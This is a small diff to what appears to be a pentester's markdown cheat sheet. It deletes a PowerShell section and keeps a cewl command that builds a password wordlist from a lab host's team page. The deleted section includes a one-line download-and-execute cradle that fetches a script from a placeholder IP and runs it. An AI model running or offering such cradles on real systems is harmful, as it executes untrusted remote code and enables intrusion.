@@ -1,12 +1,3 @@
-# powershell
-```powershell
-IEX(New-Object Net.WebClient).DownloadString("http://ip/file")
-
-Rename-Item -Path <String> -NewName <String>
-
-Remove-Item -Path "C:\Path\To\YourFile.txt"
-```
-
 # cewl(Custom Word List generator)
 ```bash
 cewl -d 5 -m 3 http://postfish.off/team.html -w /home/kali/Desktop/cewl.txt
